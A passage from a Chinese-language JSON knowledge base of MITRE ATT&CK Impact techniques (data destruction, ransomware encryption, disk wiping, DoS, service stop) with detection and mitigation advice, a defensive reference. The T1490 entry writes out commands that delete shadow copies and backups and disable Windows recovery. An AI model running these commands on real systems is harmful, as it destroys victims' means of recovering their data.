			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "账户访问移除"
}, {
	"id": "T1485",
	"description": "<p>攻击者可能会破坏特定系统或网络上大量系统中的数据和文件，从而中断系统、服务和网络资源的可用性。他们通过覆盖本地和远程驱动器上的文件或数据使得数据无法通过取证技术恢复。常见的操作系统文件删除命令（例如<code>del</code> 和<code>rm</code> ）通常只删除指向文件的指针，而不会擦除文件本身的内容，从而使得文件可以通过适当的取证方法来恢复。“数据破坏”与“磁盘内容擦除”及“磁盘结构擦除”的不同之处在于“数据破坏”破坏的是单个文件，而不是存储磁盘分区或磁盘逻辑结构。</p><p>攻击者可能会尝试使用随机生成的数据覆盖文件和目录，从而使其无法恢复。某些情况下，攻击者会使用具有政治倾向的图像文件来覆盖数据。</p><p>为了在以网络范围的可用性中断为目标的操作中最大限度地影响目标组织，设计用于破坏数据的恶意软件可能具有类似蠕虫的功能，通过利用其他技术（如有效帐户、凭据导出、Windows管理员共享等）在网络上传播。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root", "系统"],
		"dataSources": ["文件监控", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测数据破坏活动相关二进制文件的执行和命令行参数，例如SDelete。监控可疑文件的创建以及异常文件修改活动。特别是，请在用户目录和<code>C:\\Windows\\System32\\</code>下查找是否有大量文件修改活动。</p>",
		"mitigations": [{
			"name": "数据备份",
			"description": "考虑实施IT容灾计划，包括可用于恢复组织数据的定期数据备份过程。确保备份数据存储在系统之外并且受到保护，以防攻击者使用常见方法访问、破坏并阻止备份数据恢复。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "数据破坏"
}, {
	"id": "T1486",
	"description": "<p>攻击者可能会加密目标系统或网络上大量系统中的数据，从而中断系统和网络资源的可用性。他们可以尝试通过加密本地和远程驱动器上的文件或数据并扣留解密密钥的访问权限来使得存储的数据不可访问。这样做可能是为了让攻击者提供金钱补偿来换取解密或解密密钥（勒索软件），或者在密钥未被保存或传输的情况下使得数据永久不可访问。如果攻击者使用了勒索软件，常见的用户文件如Office文档、PDF、图像、视频、音频、文本和源代码文件，都会被加密。某些情况下，攻击者可能会加密关键系统文件、磁盘分区和MBR。</p><p>为了最大限度地影响目标组织，设计用于加密数据的恶意软件可能具有类似蠕虫的功能，通过利用其他攻击技术（如有效帐户、凭据导出、Windows管理员共享等）在网络上传播。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root", "系统"],
		"dataSources": ["内核驱动程序", "文件监控", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测数据破坏活动相关二进制文件的执行和命令行参数，例如vssadmin，wbadmin和bcdedit。监控可疑文件的创建以及异常文件修改活动。特别是，请在用户目录下查找是否有大量文件修改活动。</p><p>某些情况下，监控异常的内核驱动程序安装活动可以帮助检测。</p>",
		"mitigations": [{
			"name": "数据备份",
			"description": "考虑实施IT容灾计划，包括可用于恢复组织数据的定期数据获取和测试过程。确保备份数据存储在系统之外并且受到保护，以防攻击者使用常见方法访问、破坏并阻止备份数据恢复。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "为了恶劣影响而数据加密"
}, {
	"id": "T1491",
	"description": "<p>攻击者可能会修改企业网内外的可视内容，目的是传递消息，恐吓或获取（可能是欺骗）信任来入侵系统。</p><p>内部</p><p>攻击者可能会针对组织内部系统实施网页置换攻击来恐吓或误导用户，比如修改网站内容或置换桌面壁纸。他们可能会用令人不安或反感的图像来引起用户不适或迫使用户顺从随附的消息。尽管网页置换攻击暴露了攻击者的存在，但它通常发生在其他入侵目标完成之后。</p><p>外部</p><p>网站是攻击者和黑客团体实施网页置换攻击的常见目标，目的是发布政治信息或展开宣传。网页置换攻击可能是事件的催化剂，或用于回应组织或政府的行动。网页置换攻击也可能其它攻击（如网页木马攻陷）的骗局或先兆。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "web应用防火墙日志", "web日志"]
	},
	"relations": {
		"detection": "<p>监控内外部网站上计划外的内容修改。监控应用日志中来查看是否有异常行为表示攻击者执行了漏洞攻击尝试或已取得成功。执行深度数据包检查来查看常见漏洞攻击的副产物，例如SQL注入。Web应用防火墙可以检测到与漏洞攻击企图相关的不恰当输入。</p>",
		"mitigations": [{
			"name": "数据备份",
			"description": "考虑实施IT容灾计划，包括可用于恢复组织数据的定期数据备份过程。确保备份数据存储在系统之外并且受到保护，以防攻击者使用常见方法访问、破坏并阻止备份数据恢复。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "网页置换攻击"
}, {
	"id": "T1488",
	"description": "<p>攻击者可能会擦除特定系统以及网络中大量系统上存储设备的内容，从而中断系统和网络资源的可用性。</p><p>攻击者可能会覆盖存储设备上的部分或全部内容，使得数据无法通过存储接口恢复。有破坏意图的攻击者可能会擦除磁盘内容的任意部分，而不是擦除特定的磁盘结构或文件。为了擦除磁盘内容，攻击者可能会直接访问硬盘驱动器并用随机数据覆盖任意大小的磁盘部分。已经观察到攻击者利用RawDisk等第三方驱动程序直接访问磁盘内容。此行为与数据销毁不同，因为磁盘的部分而不是单个文件被擦除了。</p><p>为了最大限度地提高以网络可用性中断为目标的操作对目标组织的影响，用于擦除磁盘内容的恶意软件可能具有类似蠕虫的功能，可通过利用其他技术（如有效帐户，凭据转储及Windows管理员共享）在网络中传播。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root用户", "系统"],
		"dataSources": ["内核驱动", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控对敏感位置（如分区引导扇区或BIOS参数块/超级块）的数据读取/写入。监控异常的内核驱动程序安装活动。</p>",
		"mitigations": [{
			"name": "数据备份",
			"description": "考虑实施IT容灾计划，其中包含例行备份数据以用于恢复组织数据。确保备份数据存储在系统之外并受到保护，以防止攻击者可能采用常用方法获取访问权限并销毁用于恢复数据的备份数据。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "磁盘内容擦除"
}, {
	"id": "T1487",
	"description": "<p>攻击者可能会破坏或擦除引导系统所需硬盘上的磁盘数据结构。此技术针对特定的关键系统以及网络中的大量系统，目的是中断系统和网络资源的可用性。</p><p>攻击者可能会尝试通过覆盖位于主启动记录（MBR）或分区表等结构中的关键数据来使得系统无法启动。磁盘结构中包含的数据可以包括用于加载操作系统的初始可执行代码或磁盘上文件系统分区的位置。如果此信息不存在，计算机将无法在引导过程中加载操作系统，导致无法使用。磁盘结构擦除可以单独执行，也可以与磁盘内容擦除一起执行（如果磁盘所有扇区都被擦除）。</p><p>为了最大限度地提高对目标组织的影响，设计用于销毁磁盘结构的恶意软件可能具有类似蠕虫的功能，可通过利用其他技术（如有效帐户，凭据转储和Windows管理员共享）在网络中传播。</p>",
	"details": {
		"platform": ["Windows", "macOS", "Linux"],
		"permissionRequired": ["管理员", "root用户", "系统"],
		"dataSources": ["内核驱动", "MBG"]
	},
	"relations": {
		"detection": "<p>监控对敏感位置（如主引导记录和磁盘分区表）的数据读取/写入。监控异常的内核驱动程序安装活动。</p>",
		"mitigations": [{
			"name": "数据备份",
			"description": "考虑实施IT容灾计划，其中包含例行备份数据以用于恢复组织数据。确保备份数据存储在系统之外并受到保护，以防止攻击者可能采用常用方法获取访问权限并销毁用于恢复数据的备份数据。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "磁盘结构擦除"
}, {
	"id": "T1499",
	"description": "<p>攻击者可能会执行端点拒绝服务（DoS）攻击来降低或阻止服务对用户的可用性。方法包括耗尽服务（比如，网站、电子邮件、DNS和web应用）所在的系统资源或利用系统来导致持续的崩溃。已发现有攻击者出于政治目的或为了支持其它恶意活动而实施终端DoS攻击，包括分散注意力，黑客行为和敲诈勒索。</p><p>端点DoS攻击拒绝服务的可用性，但不会使提供服务访问的网络饱和。攻击者可以针对提供服务的系统上托管的应用堆栈的各个层来实施DoS攻击。这些层包括操作系统（OS），服务器应用（例如web服务器，DNS服务器，数据库）以及它们之上的应用（通常基于web）。攻击每一层需要用不同的技术来利用各个组件特有的瓶颈。DoS攻击可能发生于单个系统或分布在Internet上的多个系统，通常称为分布式DoS（DDoS）。</p><p>可以采用多种方法来针对端点资源执行DoS攻击，包括IP地址伪造和僵尸网络。</p><p>攻击者可能会使用攻击系统的原始IP地址或伪造源IP地址来使得防御程序很难从攻击流量追溯到攻击系统或启用反射。这会降低或消除网络防御设备上源地址过滤的有效性，从而增加防御程序防御攻击的难度。</p><p>僵尸网络通常用于对网络和服务进行DDoS攻击。大型僵尸网络可以从遍布全球互联网的系统中产生大量流量。攻击者可能拥有足够资源来构建和控制自己的僵尸网络基础设施，也可以租用已有的僵尸网络来实施攻击。在DDoS的一些最坏情况下，许多系统被用来生成请求，每个系统只需要发送少量数据就可以产生足够的数据量来耗尽目标的资源。这种情况下，区分DDoS流量和合法客户端变得非常困难。僵尸网络已经被用于一些引人瞩目的DDoS攻击行动，例如2012年针对美国主要银行的一系列攻击。</p><p>在流量操纵情况下，全局网络（例如高流量网关路由器）中可能存在可以更改数据包并导致合法客户端执行代码以将大量网络数据包定向到目标的点。这种类型的功能以前用于web审查，其中客户端HTTP流量被修改为包含JavaScript的引用。该JavaScript生成DDoS代码以攻击目标web服务器。</p><p>关于试图使提供服务的网络饱和的攻击，请参考“网络拒绝服务”。</p><p>操作系统耗尽泛洪</p><p>由于操作系统（OS）负责管理系统上的有限资源，它们可能会成为DoS的目标。这种攻击不需要耗尽系统上的实际资源，因为它们只需耗尽操作系统自我施加的限制。操作系统自我施加限制是为了防止整个系统因容量不满足要求而变得不堪重负。存在多种实现此目的的方法，包括TCP状态耗尽攻击，例如SYN泛洪和ACK泛洪。</p><p>SYN泛洪</p><p>SYN泛洪攻击会发送过多的SYN数据包，但TCP三向握手永远不会完成。因为每个操作系统都有最大并发TCP连接数限制，SYN泛洪攻击会很快耗尽系统接收TCP连接新请求的能力，从而阻止访问服务器提供的任何TCP服务。</p><p>ACK泛洪</p><p>ACK泛洪攻击利用了TCP协议的状态性质，发送大量ACK数据包到目标，迫使操作系统在其状态表中搜索是否已建立相关TCP连接。如果ACK数据包用于不存在的连接，操作系统必须搜索整个状态表来确认不存在匹配项。当有数量巨大的ACK数据包必需处理时，操作系统需要检查数据包状态来判断它们是否合法从而剔除恶意数据包，服务器也会不堪重负导致响应缓慢或无响应。这个过程占用了大量用于提供目标服务的资源。</p><p>服务耗尽泛洪</p><p>攻击者针对系统提供的不同网络服务以不同的方式来实施DoS攻击。他们通常以DNS和web服务器为攻击目标，但也可能以其他服务为目标。他们可用多种方法攻击web服务器软件，其中某些方法适用范围较广，而另外一些方法只适用于提供服务的软件。</p><p>简单HTTP泛洪</p><p>可以向web服务器发出大量HTTP请求，以使其和/或在其之上运行的应用不堪重负。这种泛洪攻击依赖于原始请求来实现目标，耗尽了攻击对象软件提供服务所需的各种资源。</p><p>SSL重新协商攻击</p><p>SSL重新协商攻击利用SSL/TLS协议功能。SSL/TLS协议套件包括客户端和服务器就用于后续安全连接的加密算法达成一致的机制。如果启用了SSL重新协商功能，则可以请求重新协商加密算法。在重新协商攻击中，攻击者建立SSL/TLS连接，然后生成一系列重新协商请求。由于密码重新协商在计算周期中有相当大的成本，因此处理大量重新协商请求可能会影响服务的可用性。</p><p>应用耗尽泛洪</p><p>位于web服务器堆栈顶部的web应用可以作为DoS攻击的目标。Web应用中的特定功能可能会占用大量资源。对这些功能的重复请求可能会耗尽资源并拒绝访问应用或服务器本身。</p><p>应用或系统漏洞利用</p><p>如果软件存在漏洞，利用这些漏洞可能导致应用或系统崩溃并拒绝向用户提供可用性。发生崩溃后，某些系统可能会自动重启关键应用和服务，但是很可能会重新遭受漏洞攻击，导致其处于持久的DoS状态。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["SSL/TLS检查", "web日志", "web应用防火墙日志", "网络入侵检测系统", "网络协议分析", "网络设备日志", "Netflow/Enclave技术网络流分析"]
	},
	"relations": {
		"detection": "<p>有时可以在端点DoS攻击效果足以对服务的可用性造成重大影响之前就检测到攻击的存在，但通常需要非常积极的监控和灵敏度。可使用典型的网络吞吐量监控工具（如netflow、SNMP和自定义脚本）来检测电路利用率的突然增加。对网络流量的实时、自动化和定性研究可以识别某种协议中的流量突然激增，可以用于在攻击开始时就检测到它。</p><p>除了网络级别的检测之外，端点日志记录和工具也很有用。针对web应用的攻击可能会在web服务器、应用程序服务器和/或数据库服务器中生成日志。这些日志可用于确定攻击类型，甚至可能在受到影响之前就已确定。</p><p>对外监控端点DoS攻击可能针对的服务的可用性。</p>",
		"mitigations": [{
			"name": "网络流量过滤",
			"description": "利用CDN或专门从事DoS缓解工作的提供商提供的服务来过滤服务上游的流量。通过阻止源地址发起攻击、阻止目标端口或阻止用于传输的协议来过滤边界流量。要防御SYN泛洪攻击，请启用SYN Cookies。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "终端拒绝服务"
}, {
	"id": "T1495",
	"description": "<p>攻击者可能会覆盖或破坏系统BIOS或已连接到系统的设备中的其他固件的闪存内容，以使其无法运行或无法启动。固件是指为了初始化和管理设备功能而从硬件设备上的非易失性存储器加载和执行的软件。这些设备可能包括主板，硬盘驱动器或视频卡。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["管理员", "root用户", "系统"],
		"dataSources": ["BIOS", "组件固件"]
	},
	"relations": {
		"detection": "<p>可能检测到对系统固件的操纵行为。记录BIOS的读取/写入日志并与已知的正常补丁安装行为进行比较。</p>",
		"mitigations": [{
			"name": "启动完整性检查",
			"description": "检查现有BIOS和设备固件的完整性，以确定其是否易受修改。"
		}, {
			"name": "特权账户管理",
			"description": "阻止攻击者访问特权帐户或更换系统固件所需的访问。"
		}, {
			"name": "更新软件",
			"description": "根据需要对BIOS和其他固件打补丁，以防止攻击者利用已知漏洞实施攻击。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "固件损坏"
}, {
	"id": "T1490",
	"description": "<p>攻击者可能会删除或移除内置操作系统数据，并关闭旨在帮助恢复已损坏系统的服务。操作系统可能包含可帮助修复损坏系统的功能，例如备份目录，卷影副本和自动修复功能。攻击者可能会禁用或删除系统恢复功能，以增强数据销毁和数据加密的影响。</p><p>攻击者已使用许多Windows自带的实用程序来禁用或删除系统恢复功能：</p><p><code>·          </code><code>vssadmin.exe</code>可用于删除系统上的所有卷影副本 —— <code>vssadmin.exedelete shadows /all /quiet</code></p><p><code>·          </code>Windows Management Instrumentation可用于删除卷影副本 —— <code>wmic shadowcopy delete</code></p><p>·         <code>wbadmin.exe</code>可用于删除Windows备份目录 —— <code>wbadmin.exe delete catalog-quiet</code></p><p>·         <code>bcdedit.exe</code>可用于修改引导配置数据来禁用Windows自动恢复功能 —— <code>bcdedit.exe /set{{default}} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {{default}}recoveryenabled no</code></p>",
	"details": {
		"platform": ["Windows", "macOS", "Linux"],
		"permissionRequired": ["管理员", "root用户", "系统", "用户"],
		"dataSources": ["Windows注册表", "服务", "Windows时间日志", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控禁止系统恢复所需二进制文件的执行和命令行参数，例如vssadmin，wbadmin和bcdedit。Windows事件日志，例如表示系统目录已被删除的事件524，可能包含与可疑活动相关的条目。</p><p>监控系统恢复所需服务的状态。监控注册表以查找与系统恢复功能相关的更改（例如：创建<code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>）。</p>",
		"mitigations": [{
			"name": "数据备份",
			"description": "考虑实施IT容灾计划，其中包含例行备份数据以用于恢复组织数据。确保备份数据存储在系统之外并受到保护，以防止攻击者可能采用常用方法获取访问权限并销毁用于恢复数据的备份数据。"
		}, {
			"name": "操作系统配置",
			"description": "考虑通过技术控制来防止禁用服务或删除系统恢复所需文件。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "禁止系统恢复"
}, {
	"id": "T1496",
	"description": "<p>攻击者可能会利用增选系统的资源来解决可能影响系统和/或托管服务可用性的资源相关问题。</p><p>资源劫持攻击的一个常见目的是验证加密货币网络的交易并获得虚拟货币。攻击者可能会消耗足够的系统资源，从而对攻击的计算机造成负面影响和/或使它们不能响应。资源劫持攻击的常见目标是服务器和基于云的系统，因为它们具有很高的可用资源潜力。但攻击者也可能会入侵用户端点系统来实施资源劫持攻击和挖掘加密货币。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["Azure活动日志", "Stackdriver日志", "AWS CloudTrail日志", "网络进程使用", "进程监控", "网络协议分析", "网络设备日志"]
	},
	"relations": {
		"detection": "<p>考虑监控进程资源使用情况来确定与恶意劫持计算机资源（例如CPU，内存和图形处理资源）相关的异常活动。监控加密货币挖掘软件相关的网络资源的可疑使用。监控本地系统上常见的加密采矿软件进程名称和文件，这些名称和文件可能表明存在入侵和资源使用情况。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "资源劫持"
}, {
	"id": "T1494",
	"description": "<p>攻击者可能会修改系统，以便在访问和显示给最终用户时操纵数据。通过操纵运行时数据，攻击者可能会尝试影响业务流程，组织理解和决策制定。</p><p>攻击者可能会更改用于显示数据的应用程序二进制文件，以便操纵运行时数据。攻击者还可能会使用“更改默认文件关联”和“伪装”技术来产生类似效果。修改类型及其影响取决于目标应用程序和进程以及攻击者的目的和目标。对于复杂的系统，攻击者可能需要特殊的专业知识，并可能需要访问他们通过长期的信息收集活动获得的、与系统相关的专门软件，以便产生预期的影响。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root用户", "系统"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>检查重要的应用程序二进制文件哈希、位置及可疑/意外的修改。</p>",
		"mitigations": [{
			"name": "网络分段",
			"description": "确定可能成为攻击目标的关键业务和系统流程，并努力隔离和保护这些系统，防止未经授权的访问和篡改。"
		}, {
			"name": "文件和目录权限限制",
			"description": "防止关键业务和系统进程被替换、被覆盖或被重新配置以加载潜在的恶意代码。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "运行时数据操控"
}, {
	"id": "T1489",
	"description": "<p>攻击者可能会停止或禁用系统上的服务，使得合法用户无法使用这些服务。停止关键服务可能会抑制或停止对事件的响应，或者有助于攻击者的总体目标，从而对环境造成破坏。</p><p>攻击者可能会通过禁用对组织至关重要的单个服务（例如<code>MSExchangeIS</code>）来实现目的，这将使得Exchange内容不可访问。某些情况下，攻击者可能会停止或禁用许多或所有服务，从而使系统无法使用。服务在运行时可能不允许修改其数据存储。攻击者可能会停止服务来对Exchange和SQL Server等服务的数据存储区进行数据破坏或数据加密攻击。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统", "用户"],
		"dataSources": ["进程命令行参数", "进程监控", "Windows注册表", "API监控"]
	},
	"relations": {
		"detection": "<p>监控进程和命令行参数来查看是否有关键进程终止或停止运行。</p><p>监控注册表编辑器来查看是否有服务修改或与重要服务相对应的启动程序的修改。查找已知软件、补丁周期不相关服务注册表项的修改。服务信息存储在<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>路径下的注册表中。</p><p>服务二进制路径的更改或服务启动类型更改为“禁用”可能是可疑的。</p><p>攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互，从而在常见系统实用程序外执行他们的功能，例如，使用<code>ChangeServiceConfigW</code>来阻止服务启动。</p>",
		"mitigations": [{
			"name": "网络分区",
			"description": "在与生产环境不同的网络上执行入侵检测、分析和响应系统，从而减少攻击者看到和干扰关键响应功能的机会。"
		}, {
			"name": "文件和目录权限限制",
			"description": "确保有适当的流程和文件权限，防止攻击者禁用或干扰关键服务。"
		}, {
			"name": "注册表权限限制",
			"description": "确保有适当的注册表权限，防止攻击者禁用或干扰关键服务。"
		}, {
			"name": "用户账号管理",
			"description": "限制用户账号和群组的权限，以便只有授权的管理员才能更改和配置服务。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "服务停止"
}, {
	"id": "T1492",
	"description": "<p>攻击者可能会插入、删除或操纵静态数据，以便操纵外部结果或隐藏活动。攻击者可能会试图通过操纵存储的数据来影响业务流程、组织理解和决策。</p><p>存储的数据可以包括多种文件格式，例如Office文件，数据库，存储的电子邮件和自定义文件格式。修改类型及其影响取决于数据的类型以及攻击者的目的和目标。对于复杂的系统，攻击者可能需要特殊的专业知识，并可能需要访问他们通过长期的信息收集活动获得的、与系统相关的专门软件，以便产生预期的影响。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root", "系统"],
		"dataSources": ["应用日志", "文件监控"]
	},
	"relations": {
		"detection": "<p>如果可以的话，检查重要文件哈希和位置并查看是否有修改为可疑/意外值的情况。</p>",
		"mitigations": [{
			"name": "敏感信息加密",
			"description": "考虑对重要信息进行加密，从而降低攻击者执行定制数据修改的能力。"
		}, {
			"name": "远程数据存储",
			"description": "考虑实施IT容灾计划，包括可用于恢复组织数据的定期数据备份过程。确保备份数据存储在系统之外并且受到保护，以防攻击者使用常见方法访问并操纵备份数据。"
		}, {
			"name": "文件和目录权限限制",
			"description": "确保对重要信息资源使用最小权限原则，从而减少数据操纵风险。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "存储数据操纵"
}, {
	"id": "T1529",
	"description": "<p>攻击者可能会关闭/重启系统来中断对这些系统的访问或者来破坏这些系统。操作系统可能有用于关闭/重启计算机的命令。某些情况下，这些命令还可用于远程关闭/重启计算机。关闭或重启系统可能会干扰合法用户对计算机资源的访问。</p><p>攻击者可能会在以其他方式（例如，擦除磁盘结构或禁止系统发现）影响系统后尝试关闭/重启系统，从而加速他们对系统的预期影响。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root用户", "系统"],
		"dataSources": ["Windows事件日志", "进程命令参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控与关闭或重启系统有关的二进制文件的执行以及命令行参数。Windows事件日志可能记录了与系统关闭/重启相关的事件，例如事件1074和事件6006。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "系统关闭/重启"
}, {
	"id": "T1493",
	"description": "<p>攻击者可能会在数据传输到存储或其他系统的过程中更改数据，以便操纵外部结果或隐藏活动。通过操纵传输的数据，攻击者可能会尝试影响业务流程，组织理解和决策制定。</p><p>可以通过网络连接操纵数据，或在有机会部署数据拦截及修改工具的系统进程之间操纵数据。修改类型及其影响取决于目标传输机制以及对手的目的和目标。对于复杂的系统，攻击者可能需要特殊的专业知识，并可能需要访问他们通过长期的信息收集活动获得的、与系统相关的专门软件，以便产生预期的影响。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root用户", "系统"],
		"dataSources": ["网络抓包", "网络协议分析"]
	},
	"relations": {
		"detection": "<p>如果没有适当的工具，则很难检测到网络上的数据操纵。某些情况下，可在关键文件通过网络传输时对其进行完整性检查（例如检查文件哈希）。对于涉及数据传输的一些关键过程，手动或带外完整性检查对于识别数据操纵可能是有用的。</p>",
		"mitigations": [{
			"name": "加密敏感信息",
			"description": "加密所有重要数据流，以减少定制修改对传输中数据的影响。"
		}],
		"tactics": ["TA0040"]
	},
	"name": "传输数据操纵"
}, {
	"id": "T1254",
	"description": "<p>主动扫描是向终端节点发送请求并分析响应的行为，从而识别通信系统相关信息。</p>",
	"details": {},
	"relations": {
		"detection": "<p>可通过通用防御措施检测到（是/否/部分）：是</p><p>说明：主动扫描在Internet上是一项预期的、频繁的活动。主动扫描技术/工具通常会产生良性流量，不需要防御程序进行进一步调查，因为没有可行的防御措施。这种活动很频繁，使得任何防守程序都很难追捕到，因此常常被忽视。</p><p>攻击者难度</p><p>易于攻击者执行（是/否）：是</p><p>说明：用于侦察和检测地址、路由、版本号、补丁级别、运行的协议/服务等的各种可用工具和数据源。</p>",
		"tactics": ["TA0015"]
	},
	"name": "主动扫描"
}, {
	"id": "T1253",
	"description": "<p>被动扫描是查看现有网络流量以识别相关通信系统信息的行为。</p>",
	"details": {},
	"relations": {
		"detection": "<p>可通过通用防御措施检测到（是/否/部分）：否</p><p>说明：不生成可检测的网络流量。</p><p>攻击者难度</p><p>易于攻击者执行（是/否）：是</p><p>说明：易于操作但需要可访问此数据的有利位置。</p>",
		"tactics": ["TA0015"]
	},
	"name": "被动扫描"
}]